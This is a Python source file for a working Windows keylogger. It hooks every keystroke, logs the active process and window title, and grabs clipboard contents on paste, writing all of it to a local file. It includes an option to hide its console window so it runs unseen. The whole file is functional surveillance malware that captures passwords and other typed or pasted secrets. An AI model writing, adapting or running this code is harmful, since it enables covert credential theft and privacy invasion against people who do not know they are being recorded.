# author:       Rebecca Ramnauth
# last update:  07 January 2020

from ctypes import *
import win32api, win32console, win32clipboard, win32gui 
import pythoncom, pyHook, sys, logging

# uncomment to hide console
# win = win32console.GetConsoleWindow() 
# win32gui.ShowWindow(win, 0) 

file_log = 'keys.txt' # location of file to write keys to

current_window = None
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s --- %(message)s')
logging.log(10, "[ Keylogger initialized ]")

def get_current_process():

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # now read its title
    window_title = create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # print out the header if we're in the right process
    logging.log(10, "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    # print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    
    global current_window

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        logging.log(10, chr(event.Ascii))
        #print(chr(event.Ascii))
    else: 
        # if [Ctrl-V], get value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            logging.log(10, "[PASTE] - %s" %(pasted_value))
            # print("[PASTE] - %s" %(pasted_value))
        else: 
            logging.log(10, "[%s]" % event.Key)
            # print("[%s]" % event.Key)

    # pass execution to the next registered hook 
    return True

# create and register a hook manager
hooks_manager = pyHook.HookManager() 
hooks_manager.KeyDown = KeyStroke # OnKeyboardEvent 

# register the hook and execute forever
hooks_manager.HookKeyboard()  
pythoncom.PumpMessages() 